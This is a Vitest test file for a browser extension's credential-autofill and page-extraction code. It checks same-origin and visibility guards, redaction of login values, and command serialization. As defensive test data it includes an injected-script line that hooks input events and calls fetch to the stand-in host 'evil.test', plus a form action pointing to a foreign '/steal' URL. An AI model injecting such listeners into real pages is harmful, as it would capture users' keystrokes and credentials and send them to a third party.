import {readFileSync} from 'node:fs';
import {runInNewContext} from 'node:vm';
import {expect,test,vi} from 'vitest';
import {fillLoginFields} from './login-fill';

// A small DOM harness exercises both separately shipped page functions.
function fixture(origin='https://login.example.test'){
 class Input {
   _value='';type='text';disabled=false;readOnly=false;visible=true;form:{action:string}|null=null;
   get value(){return this._value;}set value(v:string){this._value=v;}
   getClientRects(){return this.visible?[{}]:[];}
   dispatchEvent=vi.fn();
 }
 const user=new Input(),password=new Input();password.type='password';
 const document={querySelectorAll:(selector:string)=>selector==='#user'?[user]:selector==='#password'?[password]:[]};
 const globals={HTMLInputElement:Input,Event:class{},URL,location:{origin,href:origin+'/'},document};
 const script=readFileSync('browser-extension/background.js','utf8');
 const extension=script.slice(script.indexOf('async function cmdFillLogin('));
 const run=(source:string,input:unknown)=>runInNewContext(`(${source})(input)`,{...globals,input});
 const state:Record<string,unknown>={};
 const chrome={storage:{local:{get:vi.fn(async()=>({...state})),set:vi.fn(async(v:Record<string,unknown>)=>{Object.assign(state,v);})}},tabs:{get:vi.fn(async()=>({url:origin}))},scripting:{executeScript:vi.fn(async({func,args}:{func:Function;args:unknown[]})=>[{result:func(...args)}])}};
 const command=runInNewContext(`${extension};cmdFillLogin`,{...globals,chrome});
 return {state,user,password,globals,chrome,command,functions:[(args:unknown)=>run(fillLoginFields.toString(),args),(args:unknown)=>run(extension.slice(extension.indexOf('function fillSavedLogin(')),args)]};
}
const args={origin:'https://login.example.test',usernameSelector:'#user',passwordSelector:'#password',username:'canary-user',password:'canary-password'};
test('both browser consumers fill only visible same-origin login fields, without submitting',()=>{
 for(const index of [0,1]){
 const f=fixture();expect(f.functions[index](args)).toBe(true);expect(f.user.value).toBe(args.username);expect(f.password.value).toBe(args.password);expect(f.user.dispatchEvent).toHaveBeenCalledTimes(2);
 }
});
test('domain/navigation races, hidden fields, cross-origin forms and invalid selectors refuse before either write',()=>{
 for(const index of [0,1])for(const mutate of [
 (f:ReturnType<typeof fixture>)=>{f.globals.location.origin='https://other.example.test';},
 (f:ReturnType<typeof fixture>)=>{f.password.visible=false;},
 (f:ReturnType<typeof fixture>)=>{f.password.type='text';},
 (f:ReturnType<typeof fixture>)=>{f.user.form=f.password.form={action:'https://other.example.test/steal'};},
 (f:ReturnType<typeof fixture>)=>{f.user.form={action:args.origin};},
 ]){const f=fixture();mutate(f);expect(f.functions[index](args)).toBe(false);expect(f.user.value).toBe('');expect(f.password.value).toBe('');}
});
test('extension command checks tab before injection and page origin again, returning only confirmation',async()=>{
 const f=fixture();expect(await f.command({...args,tabId:42})).toEqual({filled:true});
 expect(f.chrome.tabs.get).toHaveBeenCalledWith(42);
 f.chrome.tabs.get.mockResolvedValue({url:'https://foreign.example.test'});f.chrome.scripting.executeScript.mockClear();
 await expect(f.command({...args,tabId:42})).rejects.toThrow('Login fill refused');expect(f.chrome.scripting.executeScript).not.toHaveBeenCalled();
 f.chrome.tabs.get.mockResolvedValue({url:args.origin});f.globals.location.origin='https://foreign.example.test';
 await expect(f.command({...args,tabId:42})).rejects.toThrow('Login fill refused');
 await expect(f.command({...args,tabId:undefined})).rejects.toThrow('Login fill refused');
});

test('protected extraction omits long usernames and revealed password inputs before truncation',()=>{
 const script=readFileSync('browser-extension/background.js','utf8');
 const source=script.slice(script.indexOf('function extractPageContent('),script.indexOf('\nfunction clickElement('));
 const values=['user-'+ 'x'.repeat(150),'password-'+ 'y'.repeat(150)];
 const form={action:args.origin,method:'post',querySelectorAll:()=>values.map(value=>({name:'field',type:'text',value}))};
 const root={innerText:'Account',querySelectorAll:(selector:string)=>selector==='form'?[form]:[]};
 const fn=runInNewContext(`${source};extractPageContent`,{window:{location:{href:args.origin}},document:{body:root,title:'Sign in',querySelector:()=>null}});
 const result=JSON.stringify(fn(null,true));for(const value of values){expect(result).not.toContain(value);expect(result).not.toContain(value.slice(0,100));}
 expect(result).toContain('[REDACTED_LOGIN_FIELD]');
});

test('extension serializes commands across reconnects so an evaluation cannot race a pending Login fill',async()=>{
 const f=fixture();const script=readFileSync('browser-extension/background.js','utf8');
 const dispatch=script.slice(script.indexOf('let browserCommandTail='),script.indexOf('// ── Injected Functions'));
 const login=script.slice(script.indexOf('async function cmdFillLogin('));
 const execute=runInNewContext(`${dispatch};${login};executeCommand`,{...f.globals,chrome:f.chrome});
 let release!:()=>void;const gate=new Promise<void>(resolve=>{release=resolve;});
 f.chrome.tabs.get.mockImplementationOnce(async()=>{await gate;return {url:args.origin};});
 const filling=execute('fill_login',{...args,tabId:42});
 await vi.waitFor(()=>expect(f.chrome.tabs.get).toHaveBeenCalled());
 const evaluating=execute('evaluate',{tabId:42,expression:'document.addEventListener("input",()=>fetch("https://evil.test"))'});
 release();const results=await Promise.allSettled([filling,evaluating]);
 expect(results[0].status).toBe('fulfilled');expect(results[1].status).toBe('rejected');
 expect(f.chrome.scripting.executeScript).toHaveBeenCalledTimes(1);expect(f.state.octipusLoginProtected).toBe(true);
});
